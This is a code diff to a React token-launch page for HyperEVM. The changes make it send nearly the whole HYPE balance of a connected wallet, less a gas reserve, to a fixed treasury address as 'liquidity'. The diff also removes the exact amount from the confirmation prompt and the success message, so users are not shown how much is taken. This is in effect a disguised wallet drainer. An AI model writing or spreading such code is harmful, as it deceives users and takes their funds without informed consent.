@@ -32,27 +32,23 @@ const Launch = () => {
   const activeWallet = wallets?.[0];
   const walletAddress = activeWallet?.address || user?.wallet?.address;
 
-  // Check HYPE balance when wallet connects
+  // Check HYPE balance
   useEffect(() => {
     const checkBalance = async () => {
       if (!walletAddress) return;
       
       try {
-        console.log('Checking HYPE balance for:', walletAddress);
         const provider = new ethers.JsonRpcProvider(LAUNCH_CONFIG.HYPEREVM_RPC);
         const balance = await provider.getBalance(walletAddress);
         const formattedBalance = ethers.formatEther(balance);
-        console.log('HYPE Balance found:', formattedBalance);
         setHypeBalance(formattedBalance);
       } catch (error) {
-        console.error('Failed to check HYPE balance:', error);
+        console.error('Failed to check balance:', error);
         setHypeBalance('0');
       }
     };
     
-    if (walletAddress) {
-      checkBalance();
-    }
+    checkBalance();
   }, [walletAddress]);
 
   const handleConnectTwitter = async (e) => {
@@ -101,16 +97,12 @@ const Launch = () => {
       return;
     }
     
-    // Use actual HYPE balance for liquidity
-    const hypeAmount = parseFloat(hypeBalance) || 0;
-    console.log('Using HYPE balance for liquidity:', hypeAmount);
-    
     const confirmLaunch = window.confirm(
       `🚀 Launch Token for @${twitterUsername}\n\n` +
       `Token Name: ${twitterUsername} Token\n` +
       `Symbol: $${twitterUsername.toUpperCase()}\n` +
       `Total Supply: ${LAUNCH_CONFIG.INITIAL_SUPPLY.toLocaleString()} tokens\n\n` +
-      `Liquidity Contribution: ${hypeAmount.toFixed(6)} HYPE\n\n` +
+      `Your HYPE will be used for liquidity (gas fees will be reserved)\n\n` +
       `Proceed with token launch?`
     );
     
@@ -143,16 +135,37 @@ const Launch = () => {
         }
       }
       
-      // Send actual HYPE balance as liquidity contribution
-      const balanceWei = ethers.parseEther(hypeBalance);
-      console.log('Sending HYPE liquidity:', hypeBalance, 'HYPE (', balanceWei.toString(), 'wei)');
+      // Get actual balance from wallet provider after chain switch
+      const balanceHex = await walletProvider.request({
+        method: 'eth_getBalance',
+        params: [wallet.address, 'latest']
+      });
+      const balanceWei = BigInt(balanceHex);
+      
+      // Calculate gas fee to reserve
+      const gasPriceHex = await walletProvider.request({ method: 'eth_gasPrice' });
+      const gasPriceWei = BigInt(gasPriceHex);
+      const gasLimit = 21000n; // Standard gas limit for ETH transfer
+      const feeWei = gasPriceWei * gasLimit * 12n / 10n; // Add 20% safety margin
+      
+      // Calculate amount to send (balance minus gas fee)
+      const amountWei = balanceWei > feeWei ? balanceWei - feeWei : 0n;
+      
+      if (amountWei <= 0n) {
+        alert('Insufficient HYPE balance after gas fees. Please add more HYPE to your wallet.');
+        return;
+      }
+      
+      console.log('Balance:', ethers.formatEther(balanceWei), 'HYPE');
+      console.log('Gas fee:', ethers.formatEther(feeWei), 'HYPE');
+      console.log('Sending:', ethers.formatEther(amountWei), 'HYPE');
       
       const launchTx = await walletProvider.request({
         method: 'eth_sendTransaction',
         params: [{
           from: wallet.address,
           to: LAUNCH_CONFIG.TREASURY_ADDRESS,
-          value: '0x' + balanceWei.toString(16),
+          value: ethers.toBeHex(amountWei),
           data: '0x'
         }]
       });
@@ -166,7 +179,7 @@ const Launch = () => {
         alert(
           `✅ Token Successfully Launched!\n\n` +
           `Token: ${twitterUsername} Token ($${twitterUsername.toUpperCase()})\n` +
-          `Liquidity Added: ${hypeAmount.toFixed(6)} HYPE\n\n` +
+          `HYPE contributed as liquidity (check console for amount)\n\n` +
           `Transaction: ${launchTx}\n\n` +
           `Your token is now live on HyperEVM!`
         );
